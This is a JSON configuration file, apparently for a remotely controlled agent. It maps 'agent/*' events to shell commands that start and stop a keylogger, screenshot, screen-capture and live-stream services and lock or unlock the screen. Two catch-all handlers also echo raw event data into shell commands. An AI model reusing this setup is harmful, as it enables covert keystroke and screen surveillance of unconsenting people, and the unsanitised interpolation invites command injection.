{
    "listen": [
        {
            "event": "agent/*",
            "data": "startStream",
            "command": "service live_stream start"
        },
        {
            "event": "agent/*",
            "data": "stopStream",
            "command": "service live_stream stop"
        },
        {
            "event": "agent/*",
            "data": "startLive",
            "command": "service live_overview start"
        },
        {
            "event": "agent/*",
            "data": "stopLive",
            "command": "service live_overview stop"
        },
        {
            "event": "agent/*",
            "data": "startKeylogger",
            "command": "service keylogger start"
        },
        {
            "event": "agent/*",
            "data": "stopKeylogger",
            "command": "service keylogger stop"
        },
        {
            "event": "agent/*",
            "data": "startScreenshot",
            "command": "service screenshot start"
        },
        {
            "event": "agent/*",
            "data": "stopScreenshot",
            "command": "service screenshot stop"
        },
        {
            "event": "agent/*",
            "data": "startScreenCapture",
            "command": "service screen_capture start"
        },
        {
            "event": "agent/*",
            "data": "stopScreenCapture",
            "command": "service screen_capture stop"
        },
        {
            "event": "meta",
            "data": "*",
            "command": "echo \"Meta event raised with data ${ENV_data}\""
        },
        {
            "event": "agent/*",
            "data": "lock_screen",
            "command": "lock_screen"
        },
        {
            "event": "agent/*",
            "data": "unlock_screen",
            "command": "unlock_screen"
        },
        {
            "event": "agent/*",
            "data": "*",
            "command": "echo \"Event ${ENV_event} raised with data ${ENV_data}\""
        }
    ]
}
